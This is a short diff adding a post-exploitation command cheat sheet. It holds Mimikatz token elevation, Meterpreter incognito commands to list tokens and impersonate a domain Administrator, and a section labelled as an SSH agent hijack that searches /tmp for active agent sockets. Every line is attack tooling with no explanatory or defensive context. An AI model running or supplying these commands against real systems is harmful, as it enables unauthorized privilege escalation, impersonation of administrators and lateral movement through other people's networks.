@@ -1,0 +1,9 @@
+# Mimikatz token impersonation
+token::elevate
+use incognito
+list_tokens -u
+impersonate_token "DOMAIN\\Administrator"
+# Linux SSH agent hijack
+eval "$(ssh-agent -s)"
+ssh-add ~/.ssh/id_rsa
+ls -la /tmp/ssh-*        # Check for active agents
